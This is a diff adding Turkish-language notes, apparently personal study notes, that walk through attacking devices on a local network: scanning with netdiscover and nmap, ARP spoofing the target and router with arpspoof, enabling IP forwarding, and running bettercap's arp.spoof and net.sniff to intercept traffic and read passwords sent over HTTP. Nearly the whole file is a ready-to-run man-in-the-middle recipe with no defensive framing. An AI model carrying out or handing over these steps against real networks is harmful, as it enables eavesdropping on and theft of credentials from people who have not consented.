@@ -1,0 +1,47 @@
+Bağlı olduğumuz ağdaki cihazları hacklemeye çalışacağız. Bunun için öncelikle netdiscover aracını kullanacağız bu araç ile ağımızdaki
+cihazların MAC adreslerini ve ip adreslerini göreceğiz.
+
+netdiscover -i wlan0 -r 192.168.1.0/24 -c paketSayısı -> -r kısmında hangi aralıktaki ip adreslerini tarayacağını belirtiyoruz. Biz
+tüm ip adreslerini seçtik. paket sayısıda ne kadar istek gönderileceğidir. eğer cihazlar gözükmezse daha fazla istek gönderilebilir.
+
+nmap 192.168.1.0/24 -> bağlı olduğumuz ağdaki cihazları tarar ve daha ayrıntılı bir şekilde sunar. Cihazların isimleri, açık portlar 
+vb. birçok ayrıntıyı gösterir
+
+arpspoof -i wlan0 -t hedefIP modemIP -> hedef cihaza kendi mac adreimiz ile gidip benim IP adresim bu(modem IP) diyerek kendimizi
+modem olarak tanıtırız ve cihaz tüm isteklerini modeme değil bize iletir
+
+arpspoof -i wlan0 -t modemIP hedefIP -> modeme kendi mac adresimiz ile gidip benim IP adresim bu(hedef IP) diyerek kendimizi hedef 
+cihaz olarak tanıtırız ve modem gelen isteklerin cevaplarını bize iletir.
+
+Bu işlemde hedef cihaz internet isteklerini bize iletir bizde bu isteği hedef cihazmış gibi modeme iletiriz ve modemde bizi hedef cihaz
+olarak tanıdığı için isteklerin cevaplarını bize verir bizde hedef cihaza modemmiş gibi cevapları iletiriz. Hedef cihaz internet 
+konusunda bir sıkıntı yaşamaz ama hangi siteye gittiğini veya sitelere kayıt olurken verilerini görebiliriz. Şifreleri HTTP sitelere
+girişte görebiliriz HTTPS'te göremeyiz.
+
+echo 1 > /proc/sys/net/ipv4/ip_forward -> burada diğer cihazlara ip gönderebilmeyi aktif hale getiriyoruz
+
+Bettercap Kullanımı:
+
+Bettercap ortadaki adam saldırılarını daha kolay hale getirir. Yani wireshark üzerinden paketlere tek tek bakarak arama yapmak yrine
+biraz daha filtrelenmiş bir şekilde önümüze sunar.
+
+bettercap -iface wlan0 -> bettercap başlatma
+
+bettercap arayüzüne girdikten sonra help yazarak kullanılabilecek araçları görebiliriz.
+
+net.probe on -> Ağdaki cihazları dürter ve kaç cihaz olduğunu bu cihazların ip ve mac adreslerini görürüz. bu işelm sonrasında 
+net.recon adında bir araçta çalışır. bu araçta ağ bilgilerini toplar
+
+net.show -> net.recon aracının topladığı ağ bilgilerini tablo halinde gösterir
+
+set arp.spoof.fullduplex true -> fullduplex true olarak ayarlandığında hem cihaza hem de modeme saldırı yapar
+
+set arp.spoof.internal true -> internal true olursa ağ içindeki ve ağ dışından gelen paketleri dinler. false olursa sadece
+ağ dışından gelen paketleri dinler. 
+
+set arp.spoof.targets hedefIP -> saldırı yapılacak cihazların IP adresleri girilir
+
+arp.spoof on -> ayarlamalar bittikten sonra araç çalıştırılır ve cihaz bizi modem modemde cihaz sanmaya başlar arka planda
+islem devam eder
+
+net.sniff on -> arp saldırısındaki hedef cihazın internetteki verilerini işleyebilmemiz için depolar
